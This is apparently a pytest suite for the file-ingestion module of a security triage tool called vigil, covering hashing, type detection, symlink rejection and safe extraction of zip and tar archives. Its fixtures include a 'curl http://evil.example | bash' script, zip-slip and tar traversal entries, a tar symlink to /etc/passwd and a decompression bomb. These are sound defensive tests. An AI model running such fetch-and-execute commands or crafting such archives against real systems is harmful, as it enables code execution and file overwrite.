import io
import os
import tarfile
import zipfile

import pytest

from vigil import ingestor as ing


# --- hashing --------------------------------------------------------------

def test_hash_bytes_known_vector():
    md5, sha1, sha256 = ing.hash_bytes(b"")
    assert sha256 == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"


def test_hash_file_matches_hash_bytes(tmp_path):
    p = tmp_path / "a.sh"
    p.write_bytes(b"echo hi\n")
    assert ing.hash_file(str(p)) == ing.hash_bytes(b"echo hi\n")


# --- type detection -------------------------------------------------------

def test_detect_zip_by_magic():
    assert ing.detect_type(b"PK\x03\x04rest")[0] == "archive:zip"


def test_detect_gzip_by_magic():
    assert ing.detect_type(b"\x1f\x8b\x08\x00")[0] == "archive:targz"


def test_detect_shebang_bash():
    assert ing.detect_type(b"#!/bin/bash\necho hi")[0] == "script:sh"


def test_detect_python_shebang_and_markers():
    assert ing.detect_type(b"#!/usr/bin/env python3\nimport os")[0] == "script:py"
    assert ing.detect_type(b"import sys\ndef main():\n    print(1)")[0] == "script:py"


def test_detect_powershell_by_content():
    assert ing.detect_type(b"$PSVersionTable\nNew-Object Net.WebClient")[0] == "script:ps1"


def test_extension_is_only_a_tiebreaker():
    # ambiguous content, extension hint decides, with a note
    dtype, notes = ing.detect_type(b"some ambiguous text here", ".ps1")
    assert dtype == "script:ps1"
    assert any("extension" in n for n in notes)


def test_binary_detected():
    assert ing.detect_type(b"\x00\x01\x02\x03\xff\xfe" * 20)[0] == "binary"


# --- path validation ------------------------------------------------------

def test_ingest_rejects_missing_file():
    with pytest.raises(ing.IngestError):
        ing.ingest("this/does/not/exist.sh")


def test_ingest_rejects_empty_file(tmp_path):
    p = tmp_path / "empty.sh"
    p.write_bytes(b"")
    with pytest.raises(ing.IngestError):
        ing.ingest(str(p))


def test_ingest_rejects_symlink(tmp_path):
    target = tmp_path / "real.sh"
    target.write_bytes(b"echo hi\n")
    link = tmp_path / "link.sh"
    try:
        os.symlink(str(target), str(link))
    except (OSError, NotImplementedError):
        pytest.skip("symlinks not supported on this platform/user")
    with pytest.raises(ing.IngestError):
        ing.ingest(str(link))


def test_ingest_basic_script(tmp_path):
    p = tmp_path / "s.sh"
    p.write_bytes(b"#!/bin/bash\ncurl http://evil.example | bash\n")
    result = ing.ingest(str(p))
    assert result.detected_type == "script:sh"
    assert result.size > 0
    assert len(result.sha256) == 64
    assert not result.is_archive


# --- safe archive extraction: zip -----------------------------------------

def _make_zip(path, entries):
    with zipfile.ZipFile(path, "w") as zf:
        for name, data in entries.items():
            zf.writestr(name, data)


def test_zip_extraction_basic(tmp_path):
    z = tmp_path / "a.zip"
    _make_zip(z, {"inner.sh": "#!/bin/bash\necho hi\n"})
    result = ing.ingest(str(z), extract=True)
    assert result.is_archive
    assert len(result.members) == 1
    assert result.members[0].detected_type == "script:sh"


def test_zip_slip_is_rejected(tmp_path):
    z = tmp_path / "evil.zip"
    # craft an entry that tries to escape the extraction dir
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("../../escape.sh", "pwned")
    with pytest.raises(ing.IngestError):
        ing.ingest(str(z), extract=True)


def test_zip_decompression_bomb_ratio_rejected(tmp_path):
    z = tmp_path / "bomb.zip"
    with zipfile.ZipFile(z, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("big.txt", b"A" * (5 * 1024 * 1024))  # very compressible
    with pytest.raises(ing.IngestError):
        ing.ingest(str(z), extract=True)


def test_zip_too_many_entries_rejected(tmp_path):
    z = tmp_path / "many.zip"
    with zipfile.ZipFile(z, "w") as zf:
        for i in range(ing.MAX_ARCHIVE_ENTRIES + 5):
            zf.writestr(f"f{i}.txt", "x")
    with pytest.raises(ing.IngestError):
        ing.ingest(str(z), extract=True)


# --- safe archive extraction: tar.gz --------------------------------------

def _add_tar_bytes(tf, name, data):
    info = tarfile.TarInfo(name=name)
    info.size = len(data)
    tf.addfile(info, io.BytesIO(data))


def test_targz_extraction_basic(tmp_path):
    t = tmp_path / "a.tar.gz"
    with tarfile.open(t, "w:gz") as tf:
        _add_tar_bytes(tf, "inner.py", b"import os\nprint('hi')\n")
    result = ing.ingest(str(t), extract=True)
    assert result.is_archive
    assert any(m.detected_type == "script:py" for m in result.members)


def test_tar_symlink_rejected(tmp_path):
    t = tmp_path / "link.tar"
    with tarfile.open(t, "w") as tf:
        info = tarfile.TarInfo(name="evil")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        tf.addfile(info)
    with pytest.raises(ing.IngestError):
        ing.ingest(str(t), extract=True)


def test_tar_path_traversal_rejected(tmp_path):
    t = tmp_path / "trav.tar"
    with tarfile.open(t, "w") as tf:
        _add_tar_bytes(tf, "../../escape.sh", b"pwned")
    with pytest.raises(ing.IngestError):
        ing.ingest(str(t), extract=True)
